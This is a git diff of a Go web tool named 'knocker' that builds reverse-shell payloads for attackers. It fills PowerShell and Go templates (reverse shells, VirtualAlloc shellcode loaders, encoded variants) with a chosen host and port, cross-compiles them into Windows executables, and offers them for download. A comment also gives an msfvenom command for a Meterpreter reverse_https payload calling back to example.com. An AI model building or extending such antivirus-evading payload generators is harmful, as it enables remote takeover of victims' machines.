@@ -13,6 +13,8 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"path/filepath"
+	"runtime"
 	"strings"
 	"time"
 )
@@ -27,12 +29,13 @@ type DownloadLink struct {
 
 var appconfig baseframe
 var dwnloadlink DownloadLink
-var avtesttemplate *template.Template
+var knockertemplate *template.Template
+var basepath, outpath, exepath, exeoutpath string
 
 func init() {
 	appconfig = baseframe{}
 	dwnloadlink = DownloadLink{}
-	avtesttemplate = template.Must(template.ParseFiles("./templates/knocker.html"))
+	knockertemplate = template.Must(template.ParseFiles("templates/knocker.html"))
 }
 func main() {
 	fmt.Println("knocker is ready ...")
@@ -45,7 +48,7 @@ func main() {
 }
 
 func fillappconfig() {
-	apifile, err := ioutil.ReadFile("./config/appconfig.cfg")
+	apifile, err := ioutil.ReadFile("config/appconfig.cfg")
 	if err != nil {
 		fmt.Println(err)
 	}
@@ -56,15 +59,31 @@ func fillappconfig() {
 
 }
 func buildexe(exepath string, gofilepath string) {
-	cmd := exec.Command("go", "build", "-o", exepath, gofilepath)
-	err := cmd.Start()
-	cmd.Wait()
-	if err != nil {
-		fmt.Println(err)
+	if runtime.GOOS == "linux" {
+		cmdpath, _ := exec.LookPath("bash")
+		execargs := "GOOS=windows GOARCH=386 go build -o " + exepath + " " + gofilepath
+		fmt.Println(execargs)
+		cmd := exec.Command(cmdpath, "-c", execargs)
+		err := cmd.Start()
+		cmd.Wait()
+		if err != nil {
+			fmt.Println(err)
+		} else {
+			fmt.Println(exepath)
+			fmt.Println(gofilepath)
+			fmt.Println("Build Success !")
+		}
 	} else {
-		fmt.Println(exepath)
-		fmt.Println(gofilepath)
-		fmt.Println("Build Success !")
+		cmd := exec.Command("go", "build", "-o", exepath, gofilepath)
+		err := cmd.Start()
+		cmd.Wait()
+		if err != nil {
+			fmt.Println(err)
+		} else {
+			fmt.Println(exepath)
+			fmt.Println(gofilepath)
+			fmt.Println("Build Success !")
+		}
 	}
 }
 
@@ -89,13 +108,13 @@ func shellexeccompress(source string) []byte {
 }
 
 func readandreplacefilecontent(ipport string) string {
-	baseframefile, err := os.Open("./basefiles/encode.txt")
+	baseframefile, err := os.Open("basefiles/encode.txt")
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer baseframefile.Close()
 
-	/*newgoFile, err := os.Create("./outfiles/rev.go")
+	/*newgoFile, err := os.Create("outfiles/rev.go")
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -119,13 +138,13 @@ func readandreplacefilecontent(ipport string) string {
 }
 
 func createpsrevgofile() {
-	baseframefile, err := os.Open("./basefiles/psrevcmd.go")
+	baseframefile, err := os.Open("basefiles/psrevcmd.go")
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer baseframefile.Close()
 
-	newgoFile, err := os.Create("./outfiles/rev.go")
+	newgoFile, err := os.Create("outfiles/rev.go")
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -147,13 +166,13 @@ func createpsrevgofile() {
 }
 
 func createpsvallocgofile() {
-	baseframefile, err := os.Open("./basefiles/psvalloc.go")
+	baseframefile, err := os.Open("basefiles/psvalloc.go")
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer baseframefile.Close()
 
-	newgoFile, err := os.Create("./outfiles/psvalloc.go")
+	newgoFile, err := os.Create("outfiles/psvalloc.go")
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -175,13 +194,13 @@ func createpsvallocgofile() {
 }
 
 func createencodepsvallocgofile() {
-	baseframefile, err := os.Open("./basefiles/psencodevalloc.go")
+	baseframefile, err := os.Open("basefiles/psencodevalloc.go")
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer baseframefile.Close()
 
-	newgoFile, err := os.Create("./outfiles/psencodevalloc.go")
+	newgoFile, err := os.Create("outfiles/psencodevalloc.go")
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -203,13 +222,13 @@ func createencodepsvallocgofile() {
 }
 
 func createencodedpsvirtualallocpayload(shellcode string) {
-	file, err := os.Open("./basefiles/vallocencode.ps1")
+	file, err := os.Open("basefiles/vallocencode.ps1")
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer file.Close()
 
-	newFile, err := os.Create("./outfiles/vallocencode.ps1")
+	newFile, err := os.Create("outfiles/vallocencode.ps1")
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -231,13 +250,13 @@ func createencodedpsvirtualallocpayload(shellcode string) {
 }
 
 func createpsvirtualallocpayload(rhost string, rport string, shellcode string) {
-	file, err := os.Open("./basefiles/virtualalloc.ps1")
+	file, err := os.Open("basefiles/virtualalloc.ps1")
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer file.Close()
 
-	newFile, err := os.Create("./outfiles/psvalloc.ps1")
+	newFile, err := os.Create("outfiles/psvalloc.ps1")
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -259,7 +278,7 @@ func createpsvirtualallocpayload(rhost string, rport string, shellcode string) {
 	buildexe("download/psalloc.exe", "outfiles/psvalloc.go")
 }
 
-// creategopayload("./basefiles/gorevhttp.go","./outfiles/gorevhttp.go","download/gorevhttp.exe","outfiles/gorevhttp.go")
+// creategopayload("basefiles/gorevhttp.go","outfiles/gorevhttp.go","download/gorevhttp.exe","outfiles/gorevhttp.go")
 func creategopayload(ipandport string, basefilepath string, outfilepath string, downloadlink string, sourcefilelink string) {
 	file, err := os.Open(basefilepath)
 	if err != nil {
@@ -289,13 +308,13 @@ func creategopayload(ipandport string, basefilepath string, outfilepath string, 
 }
 
 func creategorevhttppayload(ipandport string) {
-	file, err := os.Open("./basefiles/gorevhttp.go")
+	file, err := os.Open("basefiles/gorevhttp.go")
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer file.Close()
 
-	newFile, err := os.Create("./outfiles/gorevhttp.go")
+	newFile, err := os.Create("outfiles/gorevhttp.go")
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -316,13 +335,13 @@ func creategorevhttppayload(ipandport string) {
 	buildexe("download/gorevhttp.exe", "outfiles/gorevhttp.go")
 }
 func createpsrevshellpayload(rhost string, rport string) {
-	file, err := os.Open("./basefiles/rev.ps1")
+	file, err := os.Open("basefiles/rev.ps1")
 	if err != nil {
 		log.Fatal(err)
 	}
 	defer file.Close()
 
-	newFile, err := os.Create("./outfiles/revpshell.ps1")
+	newFile, err := os.Create("outfiles/revpshell.ps1")
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -350,7 +369,7 @@ func createpsrevshellpayload(rhost string, rport string) {
 
 func index(httpw http.ResponseWriter, req *http.Request) {
 	if req.Method == "GET" {
-		err := avtesttemplate.Execute(httpw, nil)
+		err := knockertemplate.Execute(httpw, nil)
 		if err != nil {
 			fmt.Println(err)
 		}
@@ -372,14 +391,14 @@ func index(httpw http.ResponseWriter, req *http.Request) {
 			//<-finflag
 			time.Sleep(5000 * time.Millisecond)
 			dwnloadlink.Link = "download/rev.exe"
-			os.Remove("./outfiles/rev.go")
+			os.Remove("outfiles/rev.go")
 			//fmt.Println(dwnloadlink.Link)
 		} else if evadeoption == "psValloc" {
 			shellcode := req.Form.Get("shellcode")
 			createpsvirtualallocpayload(rhost, rport, shellcode)
 			time.Sleep(5000 * time.Millisecond)
 			dwnloadlink.Link = "download/psalloc.exe"
-			os.Remove("./outfiles/psvalloc.go")
+			os.Remove("outfiles/psvalloc.go")
 			//fmt.Println("shellcode =" + shellcode)
 
 		} else if evadeoption == "psVallocencode" {
@@ -392,29 +411,43 @@ func index(httpw http.ResponseWriter, req *http.Request) {
 			createencodedpsvirtualallocpayload(encstring)
 			time.Sleep(5000 * time.Millisecond)
 			dwnloadlink.Link = "download/encpsalloc.exe"
-			os.Remove("./outfiles/psencodevalloc.go")
+			os.Remove("outfiles/psencodevalloc.go")
 			//fmt.Println(dwnloadlink.Link)
 
 		} else if evadeoption == "gorevhttpvalloc" {
 			//creategorevhttppayload(rhost + ":" + rport)
-			creategopayload(rhost+":"+rport, "./basefiles/gorevhttp.go", "./outfiles/gorevhttp.go", "download/gorevhttp.exe", "outfiles/gorevhttp.go")
+			basepath = filepath.FromSlash("basefiles/gorevhttp.go")
+			outpath = filepath.FromSlash("outfiles/gorevhttp.go")
+			exepath = filepath.FromSlash("download/gorevhttp.exe")
+			exeoutpath = filepath.FromSlash("outfiles/gorevhttp.go")
+			creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath)
+			//creategopayload(rhost+":"+rport, "basefiles/gorevhttp.go", "outfiles/gorevhttp.go", "download/gorevhttp.exe", "outfiles/gorevhttp.go")
 			time.Sleep(5000 * time.Millisecond)
 			dwnloadlink.Link = "download/gorevhttp.exe"
-			os.Remove("./outfiles/gorevhttp.go")
+			os.Remove("outfiles/gorevhttp.go")
 		} else if evadeoption == "goRevShel" {
-			creategopayload(rhost+":"+rport, "./basefiles/gorevcmd.go", "./outfiles/gorevcmd.go", "download/gorevcmd.exe", "outfiles/gorevcmd.go")
+			basepath = filepath.FromSlash("basefiles/gorevcmd.go")
+			outpath = filepath.FromSlash("outfiles/gorevcmd.go")
+			exepath = filepath.FromSlash("download/gorevcmd.exe")
+			exeoutpath = filepath.FromSlash("outfiles/gorevcmd.go")
+			creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath)
 			time.Sleep(5000 * time.Millisecond)
 			dwnloadlink.Link = "download/gorevcmd.exe"
-			os.Remove("./outfiles/gorevcmd.go")
+			os.Remove("outfiles/gorevcmd.go")
 		} else if evadeoption == "gorevhttpsheap" {
-			creategopayload(rhost+":"+rport, "./basefiles/gorevhttps.go", "./outfiles/gorevhttps.go", "download/gorevhttps.exe", "outfiles/gorevhttps.go")
+			basepath = filepath.FromSlash("basefiles/gorevhttps.go")
+			outpath = filepath.FromSlash("outfiles/gorevhttps.go")
+			exepath = filepath.FromSlash("download/gorevhttps.exe")
+			exeoutpath = filepath.FromSlash("outfiles/gorevhttps.go")
+			creategopayload(rhost+":"+rport, basepath, outpath, exepath, exeoutpath)
+			//creategopayload(rhost+":"+rport, "basefiles/gorevhttps.go", "outfiles/gorevhttps.go", "download/gorevhttps.exe", "outfiles/gorevhttps.go")
 			time.Sleep(5000 * time.Millisecond)
 			dwnloadlink.Link = "download/gorevhttps.exe"
-			os.Remove("./outfiles/gorevhttps.go")
+			os.Remove("outfiles/gorevhttps.go")
 		}
 		//msfvenom -p windows/meterpreter/reverse_https LHOST=example.com LPORT=443 -f psh
 
-		err = avtesttemplate.Execute(httpw, dwnloadlink)
+		err = knockertemplate.Execute(httpw, dwnloadlink)
 		if err != nil {
 			fmt.Println(err)
 		}
